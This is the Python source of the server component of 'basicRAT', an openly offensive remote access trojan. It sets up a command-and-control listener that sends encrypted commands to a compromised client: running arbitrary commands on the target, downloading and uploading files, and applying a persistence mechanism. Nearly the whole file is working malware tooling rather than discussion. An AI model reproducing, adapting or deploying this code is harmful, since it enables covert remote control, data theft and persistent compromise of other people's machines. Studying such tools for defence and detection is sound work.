#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT server
# https://github.com/vesche/basicRAT
#

import argparse
import readline
import socket
import sys
import time


# ascii banner (Crawford2) - http://patorjk.com/software/taag/
# ascii rat art credit - http://www.ascii-art.de/ascii/pqr/rat.txt
BANNER = '''
 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT
'''
HELP_TEXT = '''
download <file> - Download a file.
help            - Show this help menu.
persistence     - Apply persistence mechanism.
run <command>   - Execute a command on the target.
upload <file>   - Upload a file.
quit            - Gracefully kill client and server.
'''


def get_parser():
    parser = argparse.ArgumentParser(description='basicRAT server')
    parser.add_argument('-c', '--crypto',
                        help='C2 crypto to use.',
                        default='AES', type=str)
    parser.add_argument('-p', '--port',
                        help='Port to listen on.',
                        default=1337, type=int)
    return parser


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    crypto  = args['crypto']

    if crypto == 'AES':
        from core.crypto import AES_encrypt as encrypt
        from core.crypto import AES_decrypt as decrypt

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port))
    except socket.error:
        print 'Error: Unable to start server, port {} in use?'.format(port)
        sys.exit(1)

    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print line

    print 'basicRAT server listening on port {}...\n'.format(port)

    s.listen(10)
    conn, addr = s.accept()

    while True:
        prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()

        # allow noop
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        # display help text
        if cmd == 'help':
            print HELP_TEXT
            continue

        # send data to client
        conn.send(encrypt(prompt))

        # stop server
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        # results of command
        elif cmd == 'run':
            recv_data = conn.recv(4096)
            print decrypt(recv_data)

        # download a file
        elif cmd == 'download':
            f_name = action.split()[0]

            with open(f_name, 'wb') as f:
                while True:
                    recv_data = conn.recv(1024)
                    if not recv_data:
                        break
                    f.write(decrypt(recv_data))

        # results of persistence
        elif cmd == 'persistence':
            print 'Applying persistence mechanism...'
            recv_data = conn.recv(1024)
            print decrypt(recv_data)

        else:
            print 'Invalid command.'


if __name__ == '__main__':
    main()
